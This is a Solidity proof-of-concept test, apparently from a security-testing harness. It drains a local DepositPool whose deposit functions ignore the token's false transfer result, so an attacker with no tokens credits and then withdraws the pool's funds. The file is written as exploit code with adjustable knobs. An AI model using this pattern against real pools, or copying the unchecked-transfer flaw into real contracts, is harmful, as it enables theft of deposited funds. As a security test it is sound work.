// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {SoftToken} from "../src/SoftToken.sol";
import {DepositPool} from "../src/DepositPool.sol";

/// @notice Unchecked return value: the token answers `false` to a transfer it cannot make, the
///         pool does not look at the answer, and credits a deposit that was never paid.
/// Knobs:
///   0 `route`     0: the attacker deposits with `deposit`; 1: with `depositMany`;
///   1 `take_bps`  the part of the pool's tokens that the attacker claims, in basis points.
/// The attacker owns no tokens and has approved nothing. It "deposits" what it wants to take out,
/// then withdraws it.
contract DepositPoolUnpaidDepositPoC is AssayPoC {
    uint256 private constant BPS = 10_000;

    SoftToken internal token;
    DepositPool internal pool;

    function setUpTarget() internal override {
        token = new SoftToken();
        pool = new DepositPool(token);
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        token.mint(alice, 600e18);
        token.mint(bob, 400e18);
        vm.startPrank(alice);
        token.approve(address(pool), type(uint256).max);
        pool.deposit(600e18);
        vm.stopPrank();
        vm.startPrank(bob);
        token.approve(address(pool), type(uint256).max);
        pool.deposit(400e18);
        vm.stopPrank();

        declareKnob(0, "route", 0, 0, 1);
        declareKnob(1, "take_bps", BPS, 1, BPS);
    }

    function exploit() internal override {
        uint256 balanceBefore = token.balanceOf(attacker);
        uint256 amount = token.balanceOf(address(pool)) * knob(1) / BPS;

        vm.startPrank(attacker);
        if (knob(0) == 0) {
            pool.deposit(amount);
        } else {
            uint256[] memory amounts = new uint256[](2);
            amounts[0] = amount / 2 + 1;
            amounts[1] = amount - amounts[0];
            pool.depositMany(amounts);
        }
        pool.withdraw(amount);
        vm.stopPrank();

        attacker_profit("tok", balanceBefore, token.balanceOf(attacker));
    }
}
